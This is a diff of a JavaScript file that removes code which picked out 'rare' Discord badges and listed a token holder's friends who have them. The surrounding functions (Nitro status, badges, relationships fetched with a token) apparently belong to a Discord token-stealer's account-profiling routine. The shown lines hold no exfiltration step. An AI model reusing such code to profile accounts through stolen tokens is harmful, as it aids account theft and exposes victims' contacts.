@@ -561,15 +561,6 @@ function getNitro(flags) {
     };
 }
 
-function getRareBadges(flags) {
-    var b = '';
-    for (const prop in config.badges) {
-        let o = config.badges[prop];
-        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
-    };
-    return b;
-}
-
 function getBadges(flags) {
     var b = '';
     for (const prop in config.badges) {
@@ -619,18 +610,9 @@ async function getRelationships(token) {
     const r = json.filter((user) => {
         return user.type == 1
     })
-    var rareBadgesFriends = "";
-    for (z of r) {
-        var b = getRareBadges(z.user.public_flags)
-        if (b != "") {
-            rareBadgesFriends += b + ` | ${z.user.username}#${z.user.discriminator}\n`
-        }
-    }
-    if (!rareBadgesFriends) rareBadgesFriends = "No Rare Friends"
 
     return {
-        length: r.length,
-        frien: rareBadgesFriends
+        length: r.length
     }
 }
 
